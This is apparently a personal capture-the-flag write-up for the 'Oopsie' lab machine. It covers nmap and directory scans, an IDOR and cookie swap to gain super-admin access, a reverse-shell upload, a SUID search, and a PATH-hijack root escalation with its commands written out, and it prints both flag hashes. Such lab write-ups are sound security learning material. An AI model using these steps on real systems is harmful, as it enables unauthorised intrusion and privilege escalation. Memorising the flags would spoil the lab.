@@ -1,0 +1,145 @@
+Machine Name - oopsie ( Starting Point)
+
+Machine Ip = export ip="ip_of_the_machine"
+
+The IP will be of tun0
+
+
+
+-->Enumeration -
+
+1. Started nmap scan
+
+->
+
+# Nmap 7.80 scan initiated Thu Jul 11 10:34:57 2024 as: nmap -sC -sV -O -A -T4 -o oopsie_nmap_initialscan.txt 10.129.95.191
+Nmap scan report for 10.129.95.191
+Host is up (0.25s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
+|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
+|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=7/11%OT=22%CT=1%CU=43196%PV=Y%DS=2%DC=T%G=Y%TM=668F682
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)SEQ(SP=1
+OS:00%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O
+OS:3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=
+OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   225.60 ms 10.10.14.1
+2   268.99 ms 10.129.95.191
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Jul 11 10:35:42 2024 -- 1 IP address (1 host up) scanned in 46.19 seconds
+
+0-------------------------------------0-------------------
+
+Port 22 is open means ssh is present we will try to login from it.
+
+2. http is open (webserver is there) on 80.
+
+-> Initial gone through to the website.
+
+It's a car repair management shop.
+
+
+3. Directory enumeration
+
+Feroxbuster--
+
+301      GET        9l       28w      317c http://10.129.180.251/images => http://10.129.180.251/images/
+301      GET        9l       28w      317c http://10.129.180.251/themes => http://10.129.180.251/themes/
+301      GET        9l       28w      314c http://10.129.180.251/css => http://10.129.180.251/css/
+200      GET        0l        0w        0c http://10.129.180.251/js/index.js
+200      GET        0l        0w        0c http://10.129.180.251/themes/theme.css
+200      GET        1l        1w      773c http://10.129.180.251/css/reset.min.css
+200      GET        0l        0w        0c http://10.129.180.251/cdn-cgi/login/script.js
+301      GET        9l       28w      313c http://10.129.180.251/js => http://10.129.180.251/js/
+301      GET        9l       28w      318c http://10.129.180.251/uploads => http://10.129.180.251/uploads/
+200      GET        1l       59w     3871c http://10.129.180.251/js/min.js
+200      GET       18l       51w      762c http://10.129.180.251/css/1.css
+200      GET        0l        0w        0c http://10.129.180.251/css/new.css
+200      GET        4l       66w    31000c http://10.129.180.251/css/font-awesome.min.css
+200      GET      478l     1222w    10932c http://10.129.180.251/
+301      GET        9l       28w      316c http://10.129.180.251/fonts => http://10.129.180.251/fonts/
+200      GET      222l      527w     4735c http://10.129.180.251/cdn-cgi/login/
+301      GET        9l       28w      318c http://10.129.180.251/cdn-cgi => http://10.129.180.251/cdn-cgi/
+
+
+cdn-cgi/login  -> Let's get into the system with guest user.
+
+4. IDOR ( Insecure direct object reference )
+
+Through IDOR vulnerabilty I can change the id in the url bar of accounts to 1.
+
+Got the admin user with its's id.
+
+For uploading a reverse shell into the system we will need super admin rights.
+
+Let's find it with burp suite intruder.
+
+Got the id 30 of super admin (86575)
+
+Let's change the cookie and we got super admin account access.
+
+
+--> Initial FootHold -
+
+
+
+
+1. Reverse Shell ( Uploading from upload section. )
+
+-> Download from anysite or weevely revershell is also good.
+
+-> Boom got Reverse Shell.
+
+2. User.txt ( Let's Find user.txt)
+
+user.txt will be found inside the non-administrative user as the name suggests.
+
+Finding the local user robert.
+
+-> cat user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+
+--> Privilage Escalation -
+
+1. find / -user root -perm /4000 2>/dev/null
+
+-> Found a script with suid permissions.
+
+-> After executing got to know it was concatination output from the /root/reports/
+
+2. Got root flag with ../root.txt
+
+af13b0bee69f8a877c3faf667f7beacf
+
+3. The misconfiguration is in the cat command. The cat binary was called with relative path instead of absolute path. I changed the path and added /bin/sh in the path variable $path.
+
+export PATH=/tmp:$PATH
+cd /tmp/
+echo ‘/bin/sh’ > cat
+chmod +x cat
+
+It will help to give us root shell after execution of the command.
+
+Machine was fun to solve.
